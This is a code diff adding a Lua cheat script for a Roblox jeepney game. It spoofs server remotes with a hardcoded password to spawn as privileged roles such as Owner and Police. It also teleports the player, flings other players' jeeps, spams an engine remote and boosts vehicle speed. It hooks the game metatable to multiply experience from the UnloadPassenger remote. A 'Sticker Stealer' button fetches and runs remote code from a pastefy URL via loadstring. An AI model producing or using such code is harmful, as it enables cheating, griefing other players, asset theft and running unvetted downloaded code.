+                    ["6-Speed Manual"] = 100, ["5-Speed Manual"] = 100, ["C - 04"] = 100, ["TO - 01"] = 100,
+                    ["4HK1 Twin Turbo"] = 100, ["4JJ1"] = 100, ["BF - 02"] = 100, ["4BC2"] = 100,
+                    ["4HE1 Single Turbo"] = 100, ["4-Speed Manual (High Ratio)"] = 100, ["R - 02"] = 100, ["EO - 01"] = 100,
+                    ["T - 05 (R)"] = 100, ["T - 03 (R)"] = 100, ["TO - 02"] = 100, ["T - 04 (F)"] = 100,
+                    ["EO - 03"] = 100, ["B - 04"] = 100, ["T - 05 (F)"] = 100, ["CL - 02"] = 100,
+                    ["4JK1"] = 100, ["BA - 02"] = 100, ["EO - 04"] = 100, ["T - 04 (R)"] = 100,
+                    ["C - 02"] = 100, ["BA - 04"] = 100, ["T - 02 (F)"] = 100, ["EO - 02"] = 100,
+                    ["B - 05"] = 100, ["TO - 05"] = 100, ["CL - 01"] = 100, ["C - 03"] = 100,
+                    ["B - 03"] = 100, ["BF - 01"] = 100, ["4HF1 Twin Turbo"] = 100, ["T - 01 (F)"] = 100,
+                    ["TO - 03"] = 100, ["TO - 04"] = 100, ["B - 02"] = 100, ["R - 01"] = 100,
+                    ["T - 01 (R)"] = 100, ["4-Speed Manual"] = 100, ["EO - 05"] = 100, ["4BE1"] = 100,
+                    ["T - 03 (F)"] = 100, ["B - 01"] = 100, ["4HK1 Single Turbo"] = 100, ["D - 01"] = 100,
+                    ["C - 01"] = 100,
+                },
+                ["JeepneyName"] = selectedPartsJeep,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("CloseCustomize", 9e9):FireServer(unpack(args))
+    end
+})
+
+local function spawnRole(roleName)
+    local args = { [1] = { ["Password"] = 127731731, ["Role"] = roleName } }
+    game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("SpawnCharacter", 9e9):FireServer(unpack(args))
+end
+
+local RoleSection1 = RoleTab:AddSection("Law Enforcement")
+RoleSection1:AddButton({ Title = "Police", Description = "Spawn as Police", Callback = function() spawnRole("Police") end })
+RoleSection1:AddButton({ Title = "Fire Enforcement", Description = "Spawn as Fire Enforcement", Callback = function() spawnRole("Fire Enforcement") end })
+
+local RoleSection2 = RoleTab:AddSection("Transportation")
+RoleSection2:AddButton({ Title = "Driver", Description = "Spawn as Driver", Callback = function() spawnRole("Driver") end })
+RoleSection2:AddButton({ Title = "Conductor", Description = "Spawn as Conductor", Callback = function() spawnRole("Conductor") end })
+RoleSection2:AddButton({ Title = "Barker", Description = "Spawn as Barker", Callback = function() spawnRole("Barker") end })
+RoleSection2:AddButton({ Title = "Operator", Description = "Spawn as Operator", Callback = function() spawnRole("Operator") end })
+
+local RoleSection3 = RoleTab:AddSection("Management")
+RoleSection3:AddButton({ Title = "Owner", Description = "Spawn as Owner", Callback = function() spawnRole("Owner") end })
+RoleSection3:AddButton({ Title = "Co Owner", Description = "Spawn as Co Owner", Callback = function() spawnRole("Co Owner") end })
+RoleSection3:AddButton({ Title = "Manager", Description = "Spawn as Manager", Callback = function() spawnRole("Manager") end })
+
+local RoleSection4 = RoleTab:AddSection("Civilians")
+RoleSection4:AddButton({ Title = "Player", Description = "Spawn as Player", Callback = function() spawnRole("Player") end })
+RoleSection4:AddButton({ Title = "Civilian", Description = "Spawn as Civilian", Callback = function() spawnRole("Civilian") end })
+RoleSection4:AddButton({ Title = "Passenger", Description = "Spawn as Passenger", Callback = function() spawnRole("Passenger") end })
+RoleSection4:AddButton({ Title = "VIP", Description = "Spawn as VIP", Callback = function() spawnRole("VIP") end })
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local function teleportTo(targetPosition)
+    local player = LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    local targetCFrame = CFrame.new(targetPosition)
+    if humanoid and humanoid.SeatPart then
+        local jeepFolder = workspace:FindFirstChild("Jeepnies")
+        local jeep = jeepFolder and jeepFolder:FindFirstChild(player.Name)
+        if jeep then
+            local root = jeep.PrimaryPart or jeep:FindFirstChildWhichIsA("BasePart")
+            if root then
+                jeep:SetPrimaryPartCFrame(targetCFrame)
+                return
+            end
+        end
+    end
+    char:PivotTo(targetCFrame)
+end
+
+local TpSection1 = TpTab:AddSection("Terminals")
+TpSection1:AddButton({ Title = "Bulakan Terminal", Description = "Bulakan - Balagtas", Callback = function() teleportTo(Vector3.new(-626, 16, -3202)) end })
+TpSection1:AddButton({ Title = "Balagtas Terminal", Description = "Balagtas - Bulakan", Callback = function() teleportTo(Vector3.new(-3922, 17, 3156)) end })
+TpSection1:AddButton({ Title = "Malolos Terminal", Description = "Malolos - Bulakan", Callback = function() teleportTo(Vector3.new(17606, 16, -1195)) end })
+TpSection1:AddButton({ Title = "Guiguinto Terminal", Description = "Guiguinto - Bulakan", Callback = function() teleportTo(Vector3.new(1060, 16, 3167)) end })
+
+local TpSection2 = TpTab:AddSection("Drop Off")
+TpSection2:AddButton({ Title = "Drop point Bulakan - Guiguinto", Description = "Bulakan to Guiguinto drop point", Callback = function() teleportTo(Vector3.new(1049.858, 14.004, 3246.740)) end })
+TpSection2:AddButton({ Title = "Drop point Guiguinto - Bulakan", Description = "Guiguinto to Bulakan drop point", Callback = function() teleportTo(Vector3.new(-1545, 13, -3470)) end })
+TpSection2:AddButton({ Title = "Drop point Bulakan - Malolos", Description = "Bulakan to Malolos drop point", Callback = function() teleportTo(Vector3.new(17793, 13, -1080)) end })
+TpSection2:AddButton({ Title = "Drop point Bulakan - Balagtas", Description = "Bulakan to Balagtas drop point", Callback = function() teleportTo(Vector3.new(-3802, 13, 3357)) end })
+TpSection2:AddButton({ Title = "Drop point Balagtas - Bulakan", Description = "Balagtas to Bulakan drop point", Callback = function() teleportTo(Vector3.new(-1512, 13, -3471)) end })
+
+local TpSection3 = TpTab:AddSection("Locations")
+TpSection3:AddButton({ Title = "Talyer", Description = "Teleport to Talyer", Callback = function() teleportTo(Vector3.new(-430.981, 12.701, 620.724)) end })
+TpSection3:AddButton({ Title = "Police Station", Description = "Teleport to Police Station", Callback = function() teleportTo(Vector3.new(1240.597, 12.863, 3211.784)) end })
+TpSection3:AddButton({ Title = "Malolos", Description = "Teleport to Malolos", Callback = function() teleportTo(Vector3.new(17796, 13, -1104)) end })
+TpSection3:AddButton({ Title = "Balagtas", Description = "Teleport to Balagtas", Callback = function() teleportTo(Vector3.new(-3879, 14, 3482)) end })
+TpSection3:AddButton({ Title = "Guiguinto", Description = "Teleport to Guiguinto", Callback = function() teleportTo(Vector3.new(822, 13, 3290)) end })
+
+local TrollSection1 = TrollTab:AddSection("Jeep Flinger")
+local flingTargetName = ""
+
+TrollSection1:AddInput({
+    Title = "Target Player",
+    Description = "Enter the player name to fling their jeep",
+    PlaceHolder = "Username",
+    Default = "",
+    Callback = function(value)
+        flingTargetName = value
+    end
+})
+
+TrollSection1:AddButton({
+    Title = "Fling Jeep",
+    Description = "Launch the target player's jeep",
+    Callback = function()
+        if flingTargetName == "" then return end
+        local target = game:GetService("Players"):FindFirstChild(flingTargetName)
+        if not target then return end
+        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+            local lp = game.Players.LocalPlayer
+            local char = lp.Character
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                local oldPos = hrp.CFrame
+                local velocity = Instance.new("BodyVelocity")
+                velocity.Velocity = Vector3.new(0, 5000, 0)
+                velocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+                velocity.Parent = hrp
+                local angular = Instance.new("BodyAngularVelocity")
+                angular.AngularVelocity = Vector3.new(0, 5000, 0)
+                angular.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+                angular.Parent = hrp
+                for i = 1, 20 do
+                    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+                        hrp.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, -3, 0)
+                    end
+                    task.wait(0.01)
+                end
+                velocity:Destroy()
+                angular:Destroy()
+                hrp.CFrame = oldPos
+                hrp.Velocity = Vector3.new(0, 0, 0)
+                hrp.RotVelocity = Vector3.new(0, 0, 0)
+            end
+        end
+    end
+})
+
+local TrollSection2 = TrollTab:AddSection("Jeep Breathing")
+local breathingActive = false
+local breathingLoop = nil
+local breathingArgs = {
+    [1] = {
+        ["Fuel"] = 49.953315130533426, ["RPM"] = 5038.496529512335, ["DifferentialHealth"] = 99.99767451148074,
+        ["SteerC"] = 0, ["TransmissionHealth"] = 99.91350870915394, ["Throttle"] = 0.05, ["Mileage"] = 3,
+        ["BatteryHealth"] = 99.99991666666666, ["Gear"] = 1, ["DeductedExp"] = 0, ["Crashed"] = true,
+        ["OilPressure"] = 82.42581781366252, ["FrontTiresHealth"] = 99.99767451148074, ["BrakeFluid"] = 99.99987500000003,
+        ["TransmissionOil"] = 99.99560390412398, ["IsOn"] = true, ["ClutchHealth"] = 99.9997240000007,
+        ["Brake"] = 0, ["RadiatorHealth"] = 0.00001, ["CoolantLevel"] = 99.99802499999937, ["BrakeHealth"] = 99.9997916666667,
+        ["RearTiresHealth"] = 99.99767451148074, ["EngineHealth"] = 43.07487705791836, ["EngineTemp"] = 95.69588807392931,
+        ["Speed"] = 25.170116424560547, ["EngineOil"] = 99.99560390412398, ["SteerT"] = 0,
+    }
+}
+
+TrollSection2:AddToggle({
+    Title = "Jeep Breathing",
+    Description = "Start it Automatic Jeep Breathing",
+    Default = false,
+    Callback = function(state)
+        breathingActive = state
+        if state then
+            local player = game.Players.LocalPlayer
+            local character = player.Character or player.CharacterAdded:Wait()
+            local jeepnies = workspace:WaitForChild("Jeepnies", 9e9)
+            local vehicle = jeepnies:WaitForChild(character.Name, 9e9)
+            local engineRE = vehicle:WaitForChild("EngineRE", 9e9)
+            breathingLoop = task.spawn(function()
+                while breathingActive do
+                    pcall(function() engineRE:FireServer(unpack(breathingArgs)) end)
+                    task.wait(0)
+                end
+            end)
+        else
+            if breathingLoop then
+                task.cancel(breathingLoop)
+                breathingLoop = nil
+            end
+        end
+    end
+})
+
+local BoostSection1 = BoostTab:AddSection("Speed")
+local velocityEnabled = false
+local velocityMult = 0.01572
+local maxSpeed = 140
+local customSpeedValue = 0.01572
+local customMaxSpeed = 140
+local currentSeat = nil
+local gasHeld = false
+local brakeHeld = false
+local wHeld = false
+local gasButton = nil
+local brakeButton = nil
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+BoostSection1:AddInput({
+    Title = "Type Speed",
+    Description = "Enter speed value (Default: 0.01572)",
+    PlaceHolder = "0.01572",
+    Default = "0.01572",
+    Callback = function(value)
+        local num = tonumber(value)
+        if num then
+            customSpeedValue = num
+            velocityMult = num
+        end
+    end
+})
+
+BoostSection1:AddInput({
+    Title = "Max Speed",
+    Description = "Enter maximum speed limit (Default: 140)",
+    PlaceHolder = "140",
+    Default = "140",
+    Callback = function(value)
+        local num = tonumber(value)
+        if num then
+            customMaxSpeed = num
+            maxSpeed = num
+        end
+    end
+})
+
+BoostSection1:AddButton({
+    Title = "Apply Speed Settings",
+    Description = "Apply Value",
+    Callback = function()
+        velocityMult = customSpeedValue
+        maxSpeed = customMaxSpeed
+        print("Speed settings applied - Type Speed: " .. velocityMult .. ", Max Speed: " .. maxSpeed)
+    end
+})
+
+BoostSection1:AddToggle({
+    Title = "Jeep Speed",
+    Description = "Boost your jeep speed when holding Gas or W",
+    Default = false,
+    Callback = function(state)
+        velocityEnabled = state
+    end
+})
+
+local function setupSeat()
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
+        local seat = humanoid.SeatPart
+        if seat and seat:IsA("BasePart") then
+            currentSeat = seat
+        else
+            currentSeat = nil
+        end
+    end)
+    local seat = humanoid.SeatPart
+    if seat and seat:IsA("BasePart") then
+        currentSeat = seat
+    end
+end
+
+setupSeat()
+LocalPlayer.CharacterAdded:Connect(setupSeat)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.W then
+        wHeld = true
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.W then
+        wHeld = false
+    end
+end)
+
+task.spawn(function()
+    repeat task.wait(0.5) until LocalPlayer:FindFirstChild("PlayerGui")
+    local playerGui = LocalPlayer.PlayerGui
+    local success, buttonsFolder = pcall(function()
+        return playerGui:WaitForChild("A-Chassis Interface"):WaitForChild("Buttons")
+    end)
+    if success and buttonsFolder then
+        gasButton = buttonsFolder:FindFirstChild("Gas")
+        brakeButton = buttonsFolder:FindFirstChild("Brake")
+        if gasButton then
+            gasButton.MouseButton1Down:Connect(function() gasHeld = true end)
+            gasButton.MouseButton1Up:Connect(function() gasHeld = false end)
+            gasButton.TouchStarted:Connect(function() gasHeld = true end)
+            gasButton.TouchEnded:Connect(function() gasHeld = false end)
+        end
+        if brakeButton then
+            brakeButton.MouseButton1Down:Connect(function() brakeHeld = true end)
+            brakeButton.MouseButton1Up:Connect(function() brakeHeld = false end)
+            brakeButton.TouchStarted:Connect(function() brakeHeld = true end)
+            brakeButton.TouchEnded:Connect(function() brakeHeld = false end)
+        end
+    end
+end)
+
+RunService.Heartbeat:Connect(function(dt)
+    if not velocityEnabled or not currentSeat then return end
+    local vel = currentSeat.AssemblyLinearVelocity
+    local speed = vel.Magnitude
+    if (gasHeld or wHeld) and not brakeHeld and speed < maxSpeed then
+        local mult = 1 + (velocityMult * (dt * 60))
+        currentSeat.AssemblyLinearVelocity = Vector3.new(vel.X * mult, vel.Y, vel.Z * mult)
+    end
+end)
+
+local MusicSection1 = MusicTab:AddSection("Music Player")
+local MusicController = {
+    currentSound = nil,
+    volume = 100,
+    loop = false,
+    isPaused = false,
+}
+
+function MusicController:Play(assetId)
+    if self.currentSound then
+        pcall(function() self.currentSound:Stop() self.currentSound:Destroy() end)
+    end
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://" .. assetId
+    sound.Volume = self.volume
+    sound.Looped = self.loop
+    sound.Parent = game:GetService("SoundService")
+    sound:Play()
+    self.currentSound = sound
+    self.isPaused = false
+end
+
+function MusicController:Stop()
+    if self.currentSound then
+        pcall(function() self.currentSound:Stop() self.currentSound:Destroy() end)
+        self.currentSound = nil
+        self.isPaused = false
+    end
+end
+
+local songs = {
+    {Id = 101998287760411, Name = "Pahintulot - Unknown Artist"},
+    {Id = 113228606989893, Name = "Palaisipan - Loonie"},
+    {Id = 91093214600377, Name = "Pamangulo - Loonie"},
+    {Id = 94020244189041, Name = "Panaginip - Unknown Artist"},
+    {Id = 103186131289010, Name = "Party 4 U (Cover) - Unknown Artist"},
+    {Id = 115245691174726, Name = "Pasko Sa Pinas - Yeng Constantino"},
+    {Id = 72274749745781, Name = "Pagsamo - Arthur Nery"},
+    {Id = 140617637775358, Name = "Purple Hail - Akala"},
+    {Id = 107764405399357, Name = "Purple Hail - Kwento"},
+    {Id = 127491860913950, Name = "Purple Hail - Para"},
+    {Id = 86793099693274, Name = "Puff Me Up - SUPAFLY"},
+    {Id = 86700413156316, Name = "Randomantic - TJ Monterde (Cover)"},
+    {Id = 99019663546064, Name = "Rebound - Silent Sanctuary"},
+    {Id = 111330689779749, Name = "Rock That Body (Budots) - Unknown Artist"},
+    {Id = 112590536755182, Name = "Sabi Ko Na Barbie Eh (Budots) - Unknown Artist"},
+    {Id = 77165853903435, Name = "Sakin Ka Pa Rin Hahalik - Nateman"},
+    {Id = 78487275982635, Name = "Salamin Salamin - Eric"},
+    {Id = 137700948886903, Name = "Nosi Ba Lasi - Sampaguita"},
+    {Id = 137209803817738, Name = "Siguro - Yeng Constantino"},
+    {Id = 106174792478284, Name = "Love Attack - Small Axe"},
+    {Id = 78426236518475, Name = "Streets (Para Sa Streets) - Hev Abi"},
+    {Id = 120200330391730, Name = "Thank You for the Love - ABS-CBN 2015"},
+    {Id = 129046939580756, Name = "The Woman Who Can't Be Moved - Unknown Artist"},
+    {Id = 133513122565592, Name = "'Til They Take My Heart Away - Gigi De Lana"},
+    {Id = 121930167781964, Name = "Titibo-Tibo - Moira Dela Torre"},
+    {Id = 138013123641752, Name = "Tingin - Cup of Joe"},
+    {Id = 133257180884988, Name = "Torete - Moonstar88"},
+    {Id = 104348021759246, Name = "Two Times (Budots) - Unknown Artist"},
+    {Id = 75880122752181, Name = "Umaasa - Unknown Artist"},
+    {Id = 81426811249394, Name = "Undressed - Sombr (Covered)"},
+    {Id = 109046857444579, Name = "Urong Sulong - Alisson Shore"},
+    {Id = 105897803731104, Name = "Wala Na Pag-ibig - Drei"},
+    {Id = 105849669299967, Name = "Walang Pag-ibig - Kievry"},
+    {Id = 137585819014180, Name = "Yellow - Coldplay (Live)"},
+}
+
+local songNames = {}
+for _, song in ipairs(songs) do
+    table.insert(songNames, song.Name)
+end
+
+local selectedSongId = songs[1].Id
+
+MusicSection1:AddDropdown({
+    Title = "Select Song",
+    Description = "Choose a song to play",
+    Values = songNames,
+    Default = songNames[1],
+    Callback = function(value)
+        for _, song in ipairs(songs) do
+            if song.Name == value then
+                selectedSongId = song.Id
+                break
+            end
+        end
+    end
+})
+
+MusicSection1:AddButton({
+    Title = "Play Selected Song",
+    Description = "Play the selected song",
+    Callback = function()
+        MusicController:Play(selectedSongId)
+    end
+})
+
+MusicSection1:AddButton({ Title = "Stop Music", Description = "Stop music", Callback = function() MusicController:Stop() end })
+
+local StealerSection1 = StealerTab:AddSection("Sticker Stealer")
+StealerSection1:AddButton({
+    Title = "Open Sticker Stealer",
+    Description = "Load the sticker stealing GUI",
+    Callback = function()
+        pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/CGaFM7SU/raw"))()
+        end)
+    end
+})
+
+pcall(function()
+    local CoreGui = game:GetService("CoreGui")
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local spyKeywords = { "Block remote", "Clear logs", "Copy code", "Get result", "Ignore remote", "Unblock all remotes", "Remote Spy" }
+    local function ScanUI(obj)
+        local detected = false
+        for _, v in pairs(obj:GetDescendants()) do
+            if v:IsA("TextButton") or v:IsA("TextLabel") then
+                for _, keyword in pairs(spyKeywords) do
+                    if string.find(string.lower(v.Text), string.lower(keyword)) then
+                        detected = true
+                        break
+                    end
+                end
+            end
+            if detected then break end
+        end
+        if detected then
+            task.wait(0.5)
+            obj:Destroy()
+            LocalPlayer:Kick("anti skid")
+        end
+    end
+    for _, child in pairs(CoreGui:GetChildren()) do
+        ScanUI(child)
+    end
+    CoreGui.ChildAdded:Connect(function(child)
+        ScanUI(child)
+    end)
+end)
+
+local mt = getrawmetatable(game)
+local old = mt.__namecall
+setreadonly(mt, false)
+
+mt.__namecall = function(remote, ...)
+    local method = getnamecallmethod()
+    if manualGainEnabled and (method == "FireServer" or method == "InvokeServer") then
+        if tostring(remote) == "UnloadPassenger" then
+            for i = 1, manualExpMultiplier do
+                old(remote, ...)
+            end
+            return
+        end
+    end
+    return old(remote, ...)
+end
+
+setreadonly(mt, true)
